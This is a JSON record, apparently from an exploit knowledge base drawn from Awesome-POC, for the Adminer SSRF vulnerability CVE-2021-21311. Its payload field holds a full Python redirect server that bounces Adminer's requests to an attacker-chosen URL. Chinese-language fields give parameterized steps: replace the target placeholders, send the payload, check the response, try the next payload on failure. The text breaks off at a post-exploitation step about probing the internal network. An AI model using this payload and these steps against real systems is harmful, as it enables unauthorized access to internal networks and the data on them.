{"id": "awesome-poc:cve-2021-21311:2", "kind": "poc", "title": "Adminer SSRF漏洞 CVE-2021-21311", "technique": "ssrf", "summary": "Web应用漏洞 / CVE-2021-21311。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2021-21311 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["Web应用漏洞", "CVE-2021-21311"], "payload_template": "#!/usr/bin/env python\n\nimport SimpleHTTPServer\nimport SocketServer\nimport sys\nimport argparse\n\ndef redirect_handler_factory(url):\n    \"\"\"\n    Returns a request handler class that redirects to supplied `url`\n    \"\"\"\n    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n       def do_GET(self):\n           self.send_response(301)\n           self.send_header('Location', url)\n           self.end_headers()\n\n       def do_POST(self):\n           self.send_response(301)\n           self.send_header('Location', url)\n           self.end_headers()\n\n    return RedirectHandler\n\n\ndef main():\n\n    parser = argparse.ArgumentParser(description='HTTP redirect server')\n\n    parser.add_argument('--port', '-p', action=\"store\", type=int, default=80, help='port to listen on')\n    parser.add_argument('--ip', '-i', action=\"store\", default=\"\", help='host interface to listen on')\n    parser.add_argument('redirect_url', action=\"store\")\n\n    myargs = parser.parse_args()\n\n    redirect_url = myargs.redirect_url\n    port = myargs.port\n    host = myargs.ip\n\n    redirectHandler = redirect_handler_factory(redirect_url)\n\n    handler = SocketServer.TCPServer((host, port), redirectHandler)\n    print(\"serving at port %s\" % port)\n    handler.serve_forever()\n\nif __name__ == \"__main__\":\n    main()", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2021-21311 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先探内网